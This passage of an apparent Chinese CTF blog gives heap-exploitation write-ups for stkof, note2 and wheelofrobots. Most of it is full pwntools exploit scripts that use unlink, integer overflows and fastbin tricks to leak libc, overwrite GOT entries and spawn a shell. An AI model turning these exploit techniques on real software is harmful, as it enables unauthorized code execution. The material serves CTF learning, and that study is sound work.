class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">data = p.recv(<span class="number">14</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">ret_addr = p.recv(<span class="number">14</span>)</span><br><span class="line">data = <span class="built_in">int</span>(data,<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">ret_addr = <span class="built_in">int</span>(ret_addr,<span class="number">16</span>) + <span class="number">0x28</span> - <span class="number">0x210</span></span><br><span class="line">libc_base = data - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;ret_addr :&#x27;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#repeat --&gt; change ret_addr --&gt; system_addr(one_gadget)</span></span><br><span class="line">one_shot = libc_base + <span class="number">0x45226</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(one_shot))</span><br><span class="line">one_shot1 = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(one_shot)[-<span class="number">2</span>:]</span><br><span class="line">one_shot2 = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(one_shot)[-<span class="number">6</span>:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span> (one_shot1,one_shot2)</span><br><span class="line">one_shot1 = <span class="built_in">int</span>(one_shot1,<span class="number">16</span>)</span><br><span class="line">one_shot2 = <span class="built_in">int</span>(one_shot2,<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">delete2()</span><br><span class="line"> </span><br><span class="line">payload3 = <span class="built_in">bytes</span>(<span class="string">&#x27;%&#123;&#125;d%13$hhn&#x27;</span>.<span class="built_in">format</span>(one_shot1),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload3 += <span class="built_in">bytes</span>(<span class="string">&#x27;%&#123;&#125;d%14$hn&#x27;</span>.<span class="built_in">format</span>(one_shot2-one_shot1),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload3 += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload3))</span><br><span class="line">payload3 += p8(<span class="number">0x0</span>)*(<span class="number">0x88</span>-<span class="built_in">len</span>(payload3))</span><br><span class="line">payload3 += p64(<span class="number">0x151</span>)</span><br><span class="line">edit1(payload3)</span><br><span class="line"> </span><br><span class="line">payload4 = <span class="string">b&#x27;5&#x27;</span> + p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(ret_addr) + p64(ret_addr+<span class="number">1</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0x5-0x6</strong></p><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p><strong>难度:★★</strong></p><p>非常经典的unlink题目</p><p>其最大的利用点是其edit功能无大小限制,可以读取任意大小数据,依此可以做到覆盖下一个chunk的prev_size和size,从而达到unlink的功能</p><p><strong>注意点1:</strong>这题的第一次o操作是在第一个chunk申请后,也就是说第一个我们申请的chunk的后面会是一个stdout的缓冲区,是我们无法利用的,因此需一个chunk引出ochunk,之后正常利用</p><p><strong>注意点2:</strong>这题没有任何能够输出有效信息的功能,故而一切有效利用信息,都需要通过基于unlink实现的改写got表,通过puts函数泄露信息,最后wiki选择的是修改atoi函数为system,但我选择的再次修改free_got,另外wiki的exp最后好像有一点问题..</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line">head=<span class="number">0x602140</span>  <span class="comment">#but the first not use so....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">idx,length,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)   <span class="comment">#ensure chunksize &gt;MAX_fastbin(0x80)</span></span><br><span class="line"><span class="comment">#alloc(0x20)</span></span><br><span class="line"></span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(head-<span class="number">0x8</span>)+p64(head)+p64(<span class="number">0x20</span>)<span class="comment">#fake chunk and unlink trigger</span></span><br><span class="line">payload1=payload1.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>)  <span class="comment">#pudding</span></span><br><span class="line">payload1+=p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)  <span class="comment">#edit prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">2</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line">free(<span class="number">3</span>)   <span class="comment">#trigger unlink</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(e.got[<span class="string">&#x27;free&#x27;</span>])+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.got[<span class="string">&#x27;free&#x27;</span>])<span class="comment">#depoloy 0,1,2</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">2</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>,<span class="number">8</span>,p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]))  <span class="comment">#free -&gt;puts</span></span><br><span class="line">free(<span class="number">1</span>)  <span class="comment">##puts(plt_addr)</span></span><br><span class="line">puts_got=p.recvuntil(<span class="string">&#x27;\nOK\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">puts_got=u64(puts_got)</span><br><span class="line">log.success(<span class="string">&#x27;puts_plt:&#x27;</span>+<span class="built_in">hex</span>(puts_got))</span><br><span class="line">libc_base=puts_got-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">read(<span class="number">2</span>,<span class="number">8</span>,p64(system))<span class="comment">#free -&gt; puts -&gt; system</span></span><br><span class="line">alloc(<span class="number">0x20</span>)</span><br><span class="line">read(<span class="number">4</span>,<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)<span class="comment">#system(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这题chunk靠不靠近top_chunk不是很重要影响不大</p><p>另外特别要注意一点是:<strong>chunk3的大小要超过fastbin的最大大小</strong>,不然的话释放chunk3<u>直接进入fastbin</u>就不会触发unlink了</p><p><strong>最后提一下gdb的显示问题,gdb会从堆的开始判断chunk的个数,以这题为例,unlink后chunk2和chunk3依然存在,这是因为gdb先判断的chunk2,这样就把我们伪造的chunk的头给包含进chunk2了,于是unlink后的chunk就没有被gdb识别,反而chunk3继续存在</strong></p><h2 id="2014HITCON-note2"><a href="#2014HITCON-note2" class="headerlink" title="2014HITCON note2"></a>2014HITCON note2</h2><p><strong>难度:★★</strong></p><p>和上一题几乎一个套路,也是标准的unlink题</p><p>防护pie没开,以及got表可写</p><p>关键的利用点在于一个整数溢出点,是的可以达到无限读的目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_4009BD</span><span class="params">(__int64 a1, __int64 a2, <span class="type">char</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>i是无符号整型,a2是有符号数,如果a2等于0,那么a2-1就是-1就会被视为一个极大的无符号数</p><p>其它和上一题一个套路</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">note2 = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newnote</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;(less than 128)&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shownote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editnote</span>(<span class="params"><span class="built_in">id</span>, choice, s</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;2.append]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;note:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">ptr0=<span class="number">0x602120</span></span><br><span class="line">content=p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>)+p64(ptr0-<span class="number">0x18</span>)+p64(ptr0-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0x60</span>)  </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;name&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;address&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">newnote(<span class="number">0x80</span>,content)</span><br><span class="line">newnote(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">newnote(<span class="number">0x80</span>,p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">content=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">newnote(<span class="number">0</span>,content)</span><br><span class="line"></span><br><span class="line">deletenote(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">content=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(note2.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">0</span>,<span class="number">1</span>,content)</span><br><span class="line"></span><br><span class="line">shownote(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">atoi_addr = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">atoi_addr=u64(atoi_addr.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">libc_base=atoi_addr-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">content = p64(system_addr)</span><br><span class="line"></span><br><span class="line">editnote(<span class="number">0</span>, <span class="number">1</span>, content)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;\bin\sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>注意点:</strong>strnat,strcpy这些函数结束判断都与’\0’有极大关系,故而相关填充时就不能随意填充0了,否则可能达不到我们需要的效果</p><h2 id="2017-insomni’hack-wheelofrobots"><a href="#2017-insomni’hack-wheelofrobots" class="headerlink" title="2017 insomni’hack wheelofrobots"></a>2017 insomni’hack wheelofrobots</h2><p><strong>难度:★★★</strong></p><p>难度更上一筹,对漏洞的发现能力要求更高</p><p>防护依然是canary和nx</p><p><strong>利用点1:</strong>读取选项的函数,读取5个字节,最后一个字节恰好能覆盖到bender的inuse状态位</p><p><strong>利用点2:</strong>在添加 Destructor 轮子的时候，并没有进行大小检测。如果读取的数为负数，那么在申请<code>calloc(1uLL, 20 * v5);</code> 时就可能导致 <code>20*v5</code> 溢出，但与此同时， <code>destructor_size = v5</code> 仍然会很大。</p><p>利用思路要更复杂,要记清楚各个指针的地址就不容易了,逻辑也要更清晰才行</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&quot;./wofr&quot;</span></span><br><span class="line">robots = ELF(<span class="string">&#x27;./wofr&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./wofr&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size=<span class="number">0</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Bender&#x27;s intelligence: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Robot Devil&#x27;s cruelty: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;Increase Destructor&#x27;s powerful: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">idx</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">idx, name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Robot&#x27;s name: \n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_robot</span>():</span><br><span class="line">    p.recvuntilb(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow_benderinuse</span>(<span class="params">inuse</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    p.send(<span class="string">b&#x27;9999&#x27;</span> + inuse)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">where, what</span>):</span><br><span class="line">    change(<span class="number">1</span>, p64(where))</span><br><span class="line">    change(<span class="number">6</span>, p64(what))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;step 1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add a fastbin chunk 0x20 and free it</span></span><br><span class="line">    <span class="comment"># so it is in fastbin, idx2-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)  <span class="comment"># idx2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overflow bender inuse with 1</span></span><br><span class="line">    overflow_benderinuse(<span class="string">b&#x27;\x01&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change bender&#x27;s fd to 0x603138, point to bender&#x27;s size</span></span><br><span class="line">    <span class="comment"># now fastbin 0x20, idx2-&gt;0x603138-&gt;NULL</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x603138</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># in order add bender again</span></span><br><span class="line">    overflow_benderinuse(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add bender again, fastbin 0x603138-&gt;NULL</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># in order to malloc chunk at 0x603138</span></span><br><span class="line">    <span class="comment"># we need to bypass the fastbin size check, i.e. set *0x603140=0x20</span></span><br><span class="line">    <span class="comment"># it is at Robot Devil</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger malloc, set tinny point to 0x603148</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wheels must &lt;= 3</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;step 2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># alloc Destructor size 60-&gt;0x50, chunk content 0x40</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># alloc devil, size=20*7=140, bigger than fastbin</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit destructor&#x27;s size to 1000 by tinny</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">    <span 